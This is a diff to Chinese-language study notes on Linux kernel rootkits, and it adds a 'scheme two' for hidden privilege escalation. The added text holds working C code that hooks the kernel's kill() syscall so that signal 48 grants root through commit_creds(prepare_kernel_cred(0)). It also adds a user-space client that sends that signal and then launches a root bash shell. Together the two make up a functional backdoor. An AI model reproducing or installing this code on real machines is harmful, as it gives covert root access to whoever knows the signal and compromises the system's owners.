@@ -361,11 +361,66 @@ unsigned long **get_syscalltable(void)
 
 向特定文件写入指定内容，该文件可以使用文件隐藏隐藏起来
 
+[参考](https://wohin.me/rootkit/2017/05/11/LinuxRootkitExp-00020.html)
+
 **方案二**
 
-发送指定SIGNAL信号
+Hook kill函数，发送指定SIGNAL信号
+
+```
+#define SIGROOT 48
+asmlinkage int fake_kill(pid_t pid, int sig){
+    switch(sig){
+        case SIGROOT:
+            commit_creds(prepare_kernel_cred(0));
+            break;
+	default:
+            return o_kill(pid,sig);
+
+    }
+    return 0;
+}
+```
 
 
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <signal.h>
+
+void sig_handler(int sig) {
+    if(sig) // avoid warnings
+
+    return;
+}
+
+int main(int argc, char *argv[]) {
+    char bash[] = "/bin/bash\x00";
+    char *envp[1] = { NULL };
+    char *arg[3] = {"/bin/bash", NULL};
+    
+    if(geteuid() == 0){
+        printf("You are already root! :)\n\n");
+        exit(0);
+    } 
+    
+    signal(48, sig_handler);
+    kill(getpid(), 48);
+
+    if (geteuid() == 0){
+        printf("\e[01;36mYou got super powers!\e[00m\n\n");
+        execve(bash, arg, envp);
+    } else {
+        printf("\e[00;31mYou have no power here! :( \e[00m\n\n");
+    }
+        
+    return 0;
+}
+
+
+```
 
 
 
